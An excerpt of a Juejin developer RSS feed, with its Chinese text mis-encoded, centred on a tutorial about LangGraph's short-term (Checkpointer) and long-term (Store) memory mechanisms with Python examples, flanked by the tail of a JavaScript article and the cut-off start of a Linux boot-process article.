<p>å»ºè®®ä½ ç°åœ¨å°±å°è¯•ç¬¬5ä¸ªç‰¹æ€§â€”â€”è™½ç„¶è¿˜ä¸æ˜¯æ­£å¼æ ‡å‡†ï¼Œä½†å®ƒä»£è¡¨äº†JavaScriptæœªæ¥çš„å‘å±•æ–¹å‘ï¼</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[LangGraph Memory æœºåˆ¶]]></title>    <link>https://juejin.cn/post/7584071941024186383</link>    <guid>https://juejin.cn/post/7584071941024186383</guid>    <pubDate>2025-12-16T06:46:21.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7584071941024186383" data-draft-id="7583891046205734964" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content=" LangGraph Memory æœºåˆ¶"/> <meta itemprop="keywords" content="åç«¯,AIGC,LangChain"/> <meta itemprop="datePublished" content="2025-12-16T06:46:21.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ ‘ç­å”å”"/> <meta itemprop="url" content="https://juejin.cn/user/3734382051604446"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
             LangGraph Memory æœºåˆ¶
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3734382051604446/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ ‘ç­å”å”
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-16T06:46:21.000Z" title="Tue Dec 16 2025 06:46:21 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>LangGraph æä¾›äº†ä¸¤ç§ç±»å‹çš„è®°å¿†æœºåˆ¶ï¼Œç”¨äºåœ¨ä¸åŒåœºæ™¯ä¸‹ä¿å­˜å’Œæ£€ç´¢ä¿¡æ¯ï¼šçŸ­æœŸè®°å¿†ï¼ˆShort-term Memoryï¼‰å’Œé•¿æœŸè®°å¿†ï¼ˆLong-term Memoryï¼‰ã€‚</p>
<h2 data-id="heading-0">æ¦‚è¿°</h2>
<ul>
<li><strong>çŸ­æœŸè®°å¿†</strong>ï¼šé€šè¿‡ Checkpointer å®ç°ï¼Œthread-scopedï¼ˆçº¿ç¨‹ä½œç”¨åŸŸï¼‰ï¼Œç”¨äºè·Ÿè¸ªå•æ¬¡ä¼šè¯ä¸­çš„å¤šè½®å¯¹è¯</li>
<li><strong>é•¿æœŸè®°å¿†</strong>ï¼šé€šè¿‡ Store å®ç°ï¼Œè·¨ä¼šè¯å­˜å‚¨ï¼Œç”¨äºå­˜å‚¨ç”¨æˆ·ç‰¹å®šæˆ–åº”ç”¨çº§åˆ«çš„æ•°æ®</li>
</ul>
<h2 data-id="heading-1">çŸ­æœŸè®°å¿†ï¼ˆShort-term Memoryï¼‰</h2>
<p>çŸ­æœŸè®°å¿†é€šè¿‡ <strong>Checkpointer</strong> å®ç°ï¼Œæ˜¯ <strong>thread-scoped</strong>ï¼ˆçº¿ç¨‹ä½œç”¨åŸŸï¼‰çš„ï¼Œç”¨äºè·Ÿè¸ªå•æ¬¡ä¼šè¯ä¸­çš„å¤šè½®å¯¹è¯ã€‚</p>
<h3 data-id="heading-2">ç‰¹ç‚¹</h3>
<ul>
<li><strong>ä½œç”¨åŸŸ</strong>ï¼šé™å®šåœ¨å•ä¸ª <code>thread_id</code> å†…</li>
<li><strong>å­˜å‚¨å†…å®¹</strong>ï¼šå¯¹è¯å†å²ã€çŠ¶æ€æ•°æ®ã€ä¸­é—´ç»“æœç­‰</li>
<li><strong>ç”Ÿå‘½å‘¨æœŸ</strong>ï¼šä¸çº¿ç¨‹ç»‘å®šï¼Œçº¿ç¨‹ç»“æŸæ—¶è®°å¿†ä¹Ÿéšä¹‹ç»“æŸ</li>
<li><strong>å®ç°æ–¹å¼</strong>ï¼šé€šè¿‡ Checkpointer åœ¨æ¯ä¸ªæ­¥éª¤ä¿å­˜çŠ¶æ€</li>
</ul>
<h3 data-id="heading-3">ä½¿ç”¨åœºæ™¯</h3>
<ul>
<li>å¤šè½®å¯¹è¯ä¸­ä¿æŒä¸Šä¸‹æ–‡</li>
<li>åœ¨ä¼šè¯ä¸­è®°ä½ç”¨æˆ·ä¹‹å‰è¯´è¿‡çš„è¯</li>
<li>ä¿å­˜ä¼šè¯ä¸­çš„ä¸´æ—¶æ•°æ®</li>
</ul>
<h3 data-id="heading-4">åŸºæœ¬ç”¨æ³•</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> langgraph.checkpoint.memory <span class="hljs-keyword">import</span> InMemorySaver
<span class="hljs-keyword">from</span> langgraph.graph <span class="hljs-keyword">import</span> StateGraph, MessagesState

<span class="hljs-comment"># åˆ›å»º checkpointer</span>
checkpointer = InMemorySaver()

<span class="hljs-comment"># ç¼–è¯‘å›¾æ—¶å¯ç”¨ checkpointer</span>
graph = builder.<span class="hljs-built_in">compile</span>(checkpointer=checkpointer)

<span class="hljs-comment"># ç¬¬ä¸€æ¬¡å¯¹è¯</span>
config = {<span class="hljs-string">"configurable"</span>: {<span class="hljs-string">"thread_id"</span>: <span class="hljs-string">"user_123"</span>}}
graph.invoke({<span class="hljs-string">"messages"</span>: [(<span class="hljs-string">"user"</span>, <span class="hljs-string">"æˆ‘å«å¼ ä¸‰"</span>)]}, config)

<span class="hljs-comment"># ç¬¬äºŒæ¬¡å¯¹è¯ - å¯ä»¥è®¿é—®ä¹‹å‰çš„æ¶ˆæ¯</span>
graph.invoke({<span class="hljs-string">"messages"</span>: [(<span class="hljs-string">"user"</span>, <span class="hljs-string">"æˆ‘åˆšæ‰è¯´æˆ‘å«ä»€ä¹ˆï¼Ÿ"</span>)]}, config)
<span class="hljs-comment"># Agent å¯ä»¥å›ç­”ï¼š"ä½ åˆšæ‰è¯´ä½ å«å¼ ä¸‰"</span>
</code></pre>
<h3 data-id="heading-5">çŸ­æœŸè®°å¿†çš„å·¥ä½œåŸç†</h3>
<ol>
<li><strong>çŠ¶æ€ä¿å­˜</strong>ï¼šåœ¨æ¯ä¸ªæ‰§è¡Œæ­¥éª¤ï¼ˆsuperstepï¼‰ï¼ŒCheckpointer è‡ªåŠ¨ä¿å­˜å›¾çš„çŠ¶æ€å¿«ç…§</li>
<li><strong>çŠ¶æ€æ¢å¤</strong>ï¼šä¸‹æ¬¡æ‰§è¡Œæ—¶ï¼Œä»ä¿å­˜çš„æ£€æŸ¥ç‚¹è¯»å–çŠ¶æ€ï¼ŒåŒ…æ‹¬ä¹‹å‰çš„å¯¹è¯å†å²</li>
<li><strong>çº¿ç¨‹éš”ç¦»</strong>ï¼šä¸åŒçš„ <code>thread_id</code> æ‹¥æœ‰ç‹¬ç«‹çš„çŠ¶æ€ï¼Œäº’ä¸å¹²æ‰°</li>
</ol>
<h3 data-id="heading-6">çŸ­æœŸè®°å¿†çš„ç”Ÿäº§ç¯å¢ƒä½¿ç”¨</h3>
<p>åœ¨ç”Ÿäº§ç¯å¢ƒä¸­ï¼Œåº”è¯¥ä½¿ç”¨æ•°æ®åº“æ”¯æŒçš„ Checkpointerï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> langgraph.checkpoint.postgres <span class="hljs-keyword">import</span> PostgresSaver

DB_URI = <span class="hljs-string">"postgresql://user:password@localhost:5432/dbname"</span>
checkpointer = PostgresSaver.from_conn_string(DB_URI)

graph = builder.<span class="hljs-built_in">compile</span>(checkpointer=checkpointer)
</code></pre>
<h2 data-id="heading-7">é•¿æœŸè®°å¿†ï¼ˆLong-term Memoryï¼‰</h2>
<p>é•¿æœŸè®°å¿†é€šè¿‡ <strong>Store</strong> å®ç°ï¼Œæ˜¯ <strong>è·¨ä¼šè¯</strong> çš„ï¼Œç”¨äºå­˜å‚¨ç”¨æˆ·ç‰¹å®šæˆ–åº”ç”¨çº§åˆ«çš„æ•°æ®ã€‚</p>
<h3 data-id="heading-8">é•¿æœŸè®°å¿†çš„ç‰¹ç‚¹</h3>
<ul>
<li><strong>ä½œç”¨åŸŸ</strong>ï¼šè·¨å¤šä¸ª <code>thread_id</code>ï¼Œå¯ä»¥åœ¨ä»»ä½•çº¿ç¨‹ä¸­è®¿é—®</li>
<li><strong>å­˜å‚¨å†…å®¹</strong>ï¼šç”¨æˆ·åå¥½ã€å†å²ä¿¡æ¯ã€çŸ¥è¯†åº“ç­‰</li>
<li><strong>ç”Ÿå‘½å‘¨æœŸ</strong>ï¼šç‹¬ç«‹äºçº¿ç¨‹ï¼ŒæŒä¹…åŒ–å­˜å‚¨</li>
<li><strong>å®ç°æ–¹å¼</strong>ï¼šé€šè¿‡ Store åœ¨è‡ªå®šä¹‰ namespace ä¸‹å­˜å‚¨</li>
</ul>
<h3 data-id="heading-9">é•¿æœŸè®°å¿†çš„ä½¿ç”¨åœºæ™¯</h3>
<ul>
<li>è®°ä½ç”¨æˆ·çš„åå¥½è®¾ç½®</li>
<li>å­˜å‚¨è·¨ä¼šè¯çš„å†å²ä¿¡æ¯</li>
<li>ä¿å­˜åº”ç”¨çº§åˆ«çš„çŸ¥è¯†åº“</li>
</ul>
<h3 data-id="heading-10">é•¿æœŸè®°å¿†çš„åŸºæœ¬ç”¨æ³•</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> langgraph.store.memory <span class="hljs-keyword">import</span> InMemoryStore

store = InMemoryStore()

<span class="hljs-comment"># ä¿å­˜ç”¨æˆ·åå¥½ï¼ˆè·¨ä¼šè¯ï¼‰</span>
<span class="hljs-keyword">await</span> store.aput(
    [<span class="hljs-string">"users"</span>, <span class="hljs-string">"user_123"</span>, <span class="hljs-string">"preferences"</span>],
    {<span class="hljs-string">"theme"</span>: <span class="hljs-string">"dark"</span>, <span class="hljs-string">"language"</span>: <span class="hljs-string">"zh-CN"</span>}
)

<span class="hljs-comment"># åœ¨ä»»ä½•çº¿ç¨‹ä¸­éƒ½å¯ä»¥è®¿é—®</span>
preferences = <span class="hljs-keyword">await</span> store.aget([<span class="hljs-string">"users"</span>, <span class="hljs-string">"user_123"</span>, <span class="hljs-string">"preferences"</span>])
<span class="hljs-built_in">print</span>(preferences)  <span class="hljs-comment"># {"theme": "dark", "language": "zh-CN"}</span>
</code></pre>
<h3 data-id="heading-11">å‘½åç©ºé—´ç»“æ„</h3>
<p>Store ä½¿ç”¨å±‚æ¬¡åŒ–çš„å‘½åç©ºé—´ç»“æ„æ¥ç»„ç»‡æ•°æ®ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># ç”¨æˆ·æ•°æ®</span>
[<span class="hljs-string">"users"</span>, <span class="hljs-string">"user_123"</span>, <span class="hljs-string">"preferences"</span>]
[<span class="hljs-string">"users"</span>, <span class="hljs-string">"user_123"</span>, <span class="hljs-string">"history"</span>]
[<span class="hljs-string">"users"</span>, <span class="hljs-string">"user_123"</span>, <span class="hljs-string">"settings"</span>]

<span class="hljs-comment"># åº”ç”¨æ•°æ®</span>
[<span class="hljs-string">"app"</span>, <span class="hljs-string">"config"</span>, <span class="hljs-string">"version"</span>]
[<span class="hljs-string">"app"</span>, <span class="hljs-string">"knowledge"</span>, <span class="hljs-string">"faq"</span>]

<span class="hljs-comment"># ç»„ç»‡æ•°æ®</span>
[<span class="hljs-string">"orgs"</span>, <span class="hljs-string">"org_456"</span>, <span class="hljs-string">"members"</span>]
</code></pre>
<h3 data-id="heading-12">é•¿æœŸè®°å¿†çš„ç”Ÿäº§ç¯å¢ƒä½¿ç”¨</h3>
<p>åœ¨ç”Ÿäº§ç¯å¢ƒä¸­ï¼Œåº”è¯¥ä½¿ç”¨æ•°æ®åº“æ”¯æŒçš„ Storeï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> langgraph.store.postgres <span class="hljs-keyword">import</span> PostgresStore

DB_URI = <span class="hljs-string">"postgresql://user:password@localhost:5432/dbname"</span>
store = PostgresStore.from_conn_string(DB_URI)
</code></pre>
<h2 data-id="heading-13">çŸ­æœŸè®°å¿† vs é•¿æœŸè®°å¿†</h2>








































<table><thead><tr><th>ç‰¹æ€§</th><th>çŸ­æœŸè®°å¿†</th><th>é•¿æœŸè®°å¿†</th></tr></thead><tbody><tr><td><strong>å®ç°</strong></td><td>Checkpointer</td><td>Store</td></tr><tr><td><strong>ä½œç”¨åŸŸ</strong></td><td>å•ä¸ª <code>thread_id</code></td><td>è·¨å¤šä¸ª <code>thread_id</code></td></tr><tr><td><strong>å­˜å‚¨å†…å®¹</strong></td><td>å¯¹è¯å†å²ã€çŠ¶æ€æ•°æ®</td><td>ç”¨æˆ·åå¥½ã€å†å²ä¿¡æ¯</td></tr><tr><td><strong>ç”Ÿå‘½å‘¨æœŸ</strong></td><td>ä¸çº¿ç¨‹ç»‘å®š</td><td>æŒä¹…åŒ–å­˜å‚¨</td></tr><tr><td><strong>ä½¿ç”¨åœºæ™¯</strong></td><td>å¤šè½®å¯¹è¯ä¸Šä¸‹æ–‡</td><td>è·¨ä¼šè¯ä¿¡æ¯</td></tr><tr><td><strong>å‘½åç©ºé—´</strong></td><td><code>thread_id</code></td><td>è‡ªå®šä¹‰ namespace</td></tr></tbody></table>
<h2 data-id="heading-14">ç»“åˆä½¿ç”¨</h2>
<p>åœ¨å®é™…åº”ç”¨ä¸­ï¼Œå¯ä»¥åŒæ—¶ä½¿ç”¨çŸ­æœŸè®°å¿†å’Œé•¿æœŸè®°å¿†ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> langgraph.checkpoint.memory <span class="hljs-keyword">import</span> InMemorySaver
<span class="hljs-keyword">from</span> langgraph.store.memory <span class="hljs-keyword">import</span> InMemoryStore

checkpointer = InMemorySaver()  <span class="hljs-comment"># çŸ­æœŸè®°å¿†</span>
store = InMemoryStore()  <span class="hljs-comment"># é•¿æœŸè®°å¿†</span>

graph = builder.<span class="hljs-built_in">compile</span>(checkpointer=checkpointer, store=store)

<span class="hljs-comment"># åœ¨èŠ‚ç‚¹ä¸­ä½¿ç”¨</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">my_node</span>(<span class="hljs-params">state</span>):
    <span class="hljs-comment"># è®¿é—®çŸ­æœŸè®°å¿†ï¼ˆå½“å‰ä¼šè¯çš„å¯¹è¯å†å²ï¼‰</span>
    messages = state[<span class="hljs-string">"messages"</span>]
    
    <span class="hljs-comment"># è®¿é—®é•¿æœŸè®°å¿†ï¼ˆç”¨æˆ·åå¥½ï¼‰</span>
    preferences = <span class="hljs-keyword">await</span> store.aget([<span class="hljs-string">"users"</span>, user_id, <span class="hljs-string">"preferences"</span>])
    
    <span class="hljs-comment"># æ ¹æ®çŸ­æœŸå’Œé•¿æœŸè®°å¿†åšå‡ºå†³ç­–</span>
    <span class="hljs-keyword">if</span> preferences.get(<span class="hljs-string">"theme"</span>) == <span class="hljs-string">"dark"</span>:
        <span class="hljs-comment"># ä½¿ç”¨æ·±è‰²ä¸»é¢˜</span>
        <span class="hljs-keyword">pass</span>
    
    <span class="hljs-keyword">return</span> {<span class="hljs-string">"messages"</span>: [(<span class="hljs-string">"assistant"</span>, <span class="hljs-string">"å›å¤"</span>)]}
</code></pre>
<h2 data-id="heading-15">æœ€ä½³å®è·µ</h2>
<h3 data-id="heading-16">1. é€‰æ‹©åˆé€‚çš„è®°å¿†ç±»å‹</h3>
<ul>
<li><strong>ä½¿ç”¨çŸ­æœŸè®°å¿†</strong>ï¼šå½“ä¿¡æ¯åªåœ¨å½“å‰ä¼šè¯ä¸­æœ‰ç”¨æ—¶</li>
<li><strong>ä½¿ç”¨é•¿æœŸè®°å¿†</strong>ï¼šå½“ä¿¡æ¯éœ€è¦åœ¨å¤šä¸ªä¼šè¯é—´å…±äº«æ—¶</li>
</ul>
<h3 data-id="heading-17">2. ç®¡ç†å¯¹è¯å†å²</h3>
<p>å¯¹äºé•¿å¯¹è¯ï¼Œè€ƒè™‘ä½¿ç”¨ä»¥ä¸‹ç­–ç•¥ï¼š</p>
<ul>
<li><strong>æˆªæ–­å†å²</strong>ï¼šåªä¿ç•™æœ€è¿‘çš„ N æ¡æ¶ˆæ¯</li>
<li><strong>æ‘˜è¦å†å²</strong>ï¼šå°†æ—§æ¶ˆæ¯æ€»ç»“ä¸ºæ‘˜è¦</li>
<li><strong>é€‰æ‹©æ€§ä¿ç•™</strong>ï¼šåªä¿ç•™é‡è¦çš„æ¶ˆæ¯</li>
</ul>
<h3 data-id="heading-18">3. å‘½åç©ºé—´è®¾è®¡</h3>
<p>è®¾è®¡æ¸…æ™°çš„å‘½åç©ºé—´ç»“æ„ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># å¥½çš„è®¾è®¡</span>
[<span class="hljs-string">"users"</span>, user_id, <span class="hljs-string">"preferences"</span>]  <span class="hljs-comment"># ç”¨æˆ·åå¥½</span>
[<span class="hljs-string">"users"</span>, user_id, <span class="hljs-string">"history"</span>]      <span class="hljs-comment"># ç”¨æˆ·å†å²</span>
[<span class="hljs-string">"app"</span>, <span class="hljs-string">"config"</span>]                   <span class="hljs-comment"># åº”ç”¨é…ç½®</span>

<span class="hljs-comment"># é¿å…</span>
[<span class="hljs-string">"data"</span>, <span class="hljs-string">"stuff"</span>]  <span class="hljs-comment"># ä¸å¤Ÿæ¸…æ™°</span>
[<span class="hljs-string">"user123"</span>]         <span class="hljs-comment"># ç¼ºå°‘å±‚æ¬¡ç»“æ„</span>
</code></pre>
<h3 data-id="heading-19">4. æ€§èƒ½è€ƒè™‘</h3>
<ul>
<li><strong>çŸ­æœŸè®°å¿†</strong>ï¼šCheckpointer åœ¨æ¯ä¸ªæ­¥éª¤éƒ½ä¼šä¿å­˜ï¼Œæ³¨æ„æ€§èƒ½å½±å“</li>
<li><strong>é•¿æœŸè®°å¿†</strong>ï¼šStore æ“ä½œæ˜¯å¼‚æ­¥çš„ï¼Œé€‚åˆæ‰¹é‡æ“ä½œ</li>
<li><strong>ç¼“å­˜ç­–ç•¥</strong>ï¼šå¯¹äºé¢‘ç¹è®¿é—®çš„æ•°æ®ï¼Œè€ƒè™‘ä½¿ç”¨ç¼“å­˜</li>
</ul>
<h3 data-id="heading-20">5. æ•°æ®ä¸€è‡´æ€§</h3>
<ul>
<li>ç¡®ä¿çŸ­æœŸè®°å¿†å’Œé•¿æœŸè®°å¿†çš„æ•°æ®ä¸€è‡´æ€§</li>
<li>åœ¨æ›´æ–°é•¿æœŸè®°å¿†æ—¶ï¼Œè€ƒè™‘äº‹åŠ¡å¤„ç†</li>
<li>å®šæœŸæ¸…ç†è¿‡æœŸçš„è®°å¿†æ•°æ®</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Linux ç³»ç»Ÿå¯åŠ¨æµç¨‹è¯¦ç»†è§£æ]]></title>    <link>https://juejin.cn/post/7584007232411172870</link>    <guid>https://juejin.cn/post/7584007232411172870</guid>    <pubDate>2025-12-16T06:28:17.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7584007232411172870" data-draft-id="7583969283791142966" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Linux ç³»ç»Ÿå¯åŠ¨æµç¨‹è¯¦ç»†è§£æ"/> <meta itemprop="keywords" content="åµŒå…¥å¼"/> <meta itemprop="datePublished" content="2025-12-16T06:28:17.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Shawn_CH"/> <meta itemprop="url" content="https://juejin.cn/user/4074114702122217"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Linux ç³»ç»Ÿå¯åŠ¨æµç¨‹è¯¦ç»†è§£æ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4074114702122217/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Shawn_CH
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-16T06:28:17.000Z" title="Tue Dec 16 2025 06:28:17 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    2
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»35åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier 